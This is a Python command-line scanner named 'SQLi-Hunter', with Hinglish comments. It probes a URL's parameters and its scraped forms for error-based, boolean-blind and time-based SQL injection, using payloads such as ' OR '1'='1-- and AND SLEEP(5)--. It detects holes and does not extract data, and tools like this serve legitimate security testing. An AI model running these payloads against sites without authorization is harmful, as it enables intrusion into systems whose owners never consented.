import requests
import argparse
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from rich.console import Console

# Global console object, jise hum baad mein configure karenge
console = Console()

def get_sql_errors():
    """Returns a list of common SQL error messages."""
    return [
        "you have an error in your sql syntax;",
        "warning: mysql_fetch_array()",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated"
    ]

def get_error_based_payloads():
    """Returns a list of basic error-based SQLi payloads."""
    return ["'", "\"", "')--", "' OR '1'='1--"]

def scan_url_parameters(url):
    """Scans URL for Error-Based, Boolean-Based, and Time-Based SQLi."""
    console.print(f"[cyan][*] Scanning URL Parameters:[/cyan] {url}")
    is_vulnerable = False

    # Test 1: Error-Based
    console.print("[yellow]    -> Testing for Error-Based SQLi...[/yellow]")
    for payload in get_error_based_payloads():
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=10)
            for error in get_sql_errors():
                if error in response.text.lower():
                    console.print(f"[bold red][!] Error-Based SQLi Vulnerability Found![/bold red]")
                    console.print(f"    [yellow]Payload:[/yellow] {payload}")
                    is_vulnerable = True; break
            if is_vulnerable: break
        except requests.RequestException: pass
    if is_vulnerable: return

    # Test 2: Boolean-Based
    console.print("[yellow]    -> Testing for Boolean-Based Blind SQLi...[/yellow]")
    try:
        original_response = requests.get(url, timeout=10)
        true_payload = " AND 1=1--"
        true_response = requests.get(f"{url}{true_payload}", timeout=10)
        false_payload = " AND 1=2--"
        false_response = requests.get(f"{url}{false_payload}", timeout=10)
        if len(original_response.text) == len(true_response.text) and len(original_response.text) != len(false_response.text):
            console.print(f"[bold red][!] Boolean-Based Blind SQLi Vulnerability Found![/bold red]")
            is_vulnerable = True
    except requests.RequestException: pass
    if is_vulnerable: return

    # Test 3: Time-Based
    console.print("[yellow]    -> Testing for Time-Based Blind SQLi...[/yellow]")
    sleep_time = 5
    time_payload = f" AND SLEEP({sleep_time})--"
    test_url = f"{url}{time_payload}"
    try:
        start_time = time.time()
        requests.get(test_url, timeout=sleep_time + 5)
        end_time = time.time()
        if (end_time - start_time) >= sleep_time:
            console.print(f"[bold red][!] Time-Based Blind SQLi Vulnerability Found![/bold red]")
            console.print(f"    [yellow]Payload:[/yellow] {time_payload}")
            is_vulnerable = True
    except requests.exceptions.ReadTimeout:
        console.print(f"[bold red][!] Time-Based Blind SQLi Vulnerability Found! (Request Timed Out as Expected)[/bold red]")
        is_vulnerable = True
    except requests.RequestException: pass
        
    if not is_vulnerable:
        console.print("[bold green][-] No common SQLi vulnerabilities found in URL parameters.[/bold green]")


def scan_forms(url):
    """Finds all forms on the page and tests them for SQLi (Error-Based)."""
    console.print(f"\n[cyan][*] Scanning Forms on:[/cyan] {url}")
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.content, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            console.print("[yellow][-] No forms found on this page.[/yellow]")
            return
        console.print(f"[green][+] Found {len(forms)} form(s). Testing...[/green]")
        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            target_url = urljoin(url, action)
            inputs = form.find_all(["input", "textarea"])
            for payload in get_error_based_payloads():
                form_data = {}
                for input_tag in inputs:
                    input_name = input_tag.get("name")
                    input_type = input_tag.get("type", "text")
                    if input_name:
                        if input_type == "text":
                            form_data[input_name] = payload
                        else:
                            form_data[input_name] = "test"
                try:
                    if method == "post":
                        res = requests.post(target_url, data=form_data, timeout=10)
                    else:
                        res = requests.get(target_url, params=form_data, timeout=10)
                    for error in get_sql_errors():
                        if error in res.text.lower():
                            console.print(f"[bold red][!] SQL Injection Vulnerability Found in a Form![/bold red]")
                            console.print(f"    [yellow]URL:[/yellow] {target_url} [bold]({method.upper()})[/bold]")
                            console.print(f"    [yellow]Payload:[/yellow] {payload}")
                            return
                except requests.RequestException: pass
    except requests.RequestException as e:
        console.print(f"[bold red][-] Error accessing the page to find forms: {e}[/bold red]")

def main():
    """Main function to parse arguments and start the scan."""
    global console

    parser = argparse.ArgumentParser(description="SQLi-Hunter - A scanner for Error, Boolean, and Time-Based SQLi.")
    parser.add_argument("-u", "--url", required=True, help="The full URL to test.")
    parser.add_argument("-o", "--output", help="Save the full scan output to a text file.")
    
    args = parser.parse_args()
    
    output_file = None
    if args.output:
        try:
            output_file = open(args.output, "w")
            console = Console(file=output_file, record=True, force_terminal=True) 
            console.print(f"[green][+] Scan output will be saved to '{args.output}'[/green]")
        except Exception as e:
            console = Console()
            console.print(f"[bold red][-] Could not open file for writing: {e}[/bold red]")

    
    scan_url_parameters(args.url)
    scan_forms(args.url)

    if output_file:
        output_file.close()
        # Yeh line theek kar di gayi hai
        Console().print(f"[bold green][+] Report successfully saved to '{args.output}'[/bold green]")


if __name__ == "__main__":
    main()